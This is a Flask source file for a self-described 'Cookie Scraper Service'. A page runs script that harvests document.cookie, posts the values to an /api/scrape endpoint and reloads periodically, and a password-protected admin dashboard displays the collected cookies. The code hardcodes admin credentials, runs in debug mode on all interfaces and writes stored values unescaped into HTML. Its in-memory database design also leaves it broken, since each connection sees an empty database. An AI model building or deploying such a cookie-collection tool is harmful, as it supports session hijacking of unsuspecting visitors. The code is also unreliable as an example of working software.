from flask import Flask, request, jsonify, session, redirect, url_for
import json
import os
import sqlite3

# Flask app setup
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'simple-secret-key')

# Database setup - use in-memory or temporary file
DB_FILE = ':memory:'  # In-memory database for serverless

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE,
        password TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    cursor.execute('''
       CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY,
        url TEXT,
        cookies TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    # Create cookies table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY,
        url TEXT,
        cookies TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Insert admin user
    cursor.execute('SELECT * FROM users WHERE username = ?', ('admin',))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', 
                      ('admin', 'securepassword'))
    
    conn.commit()
    conn.close()

# Initialize database
init_db()

@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cookie Scraper</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
            h1 { color: #333; text-align: center; }
            .links { text-align: center; margin: 30px 0; }
            a { display: inline-block; margin: 10px; padding: 12px 25px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }
            a:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔒 Cookie Scraper Service</h1>
            <div class="links">
                <a href="/scraper">Start Collection</a>
                <a href="/admin">Admin Panel</a>
                <a href="/login">Login</a>
            </div>
        </div>
    </body>
    </html>
    '''
    return html

@app.route('/scraper')
def scraper():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cookie Collection</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f8ff; }
            .status { background: #d4edda; color: #155724; padding: 20px; border-radius: 5px; margin: 20px auto; max-width: 500px; }
        </style>
    </head>
    <body>
        <h1>🍪 Collecting Cookies</h1>
        <div class="status">
            <p>Cookie collection active...</p>
        </div>
        <script>
            // Scrape cookies
            const cookieData = [];
            for (const cookie of document.cookie.split('; ')) {
                const [name, value] = cookie.split('=');
                cookieData.push({name, value});
            }
            
            // Send to server
            fetch("/api/scrape", {
                method: "POST",
                body: JSON.stringify(cookieData),
                headers: {"Content-Type": "application/json"}
            }).then(response => {
                console.log('Success');
            }).catch(error => {
                console.error('Error:', error);
            });
            
            // Refresh periodically
            setTimeout(() => location.reload(), 5000);
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Simple auth check
        if username == 'admin' and password == 'securepassword':
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            return '''
            <html>
            <body>
                <h2>Login Failed</h2>
                <a href="/login">Try Again</a>
            </body>
            </html>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Admin Login</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required><br><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Get cookies (will be empty with in-memory DB)
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM cookies ORDER BY timestamp DESC')
    cookies = cursor.fetchall()
    conn.close()
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
            th {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <h1>Admin Dashboard</h1>
        <a href="/logout">Logout</a>
        <h2>Collected Cookies ({len(cookies)})</h2>
        <table>
        <tr><th>ID</th><th>URL</th><th>Cookies</th><th>Time</th></tr>
    '''
    
    for cookie in cookies:
        html += f'<tr><td>{cookie[0]}</td><td>{cookie[1]}</td><td>{cookie[2]}</td><td>{cookie[3]}</td></tr>'
    
    html += '''
        </table>
        <p>Note: Data is stored in memory and will be lost when the server restarts.</p>
    </body>
    </html>
    '''
    
    return html

@app.route('/api/scrape', methods=['POST'])
def api_scrape():
    try:
        cookies = request.get_json()
        
        # Store in database
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO cookies (url, cookies) VALUES (?, ?)', 
                      (request.host_url, json.dumps(cookies)))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'count': len(cookies)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))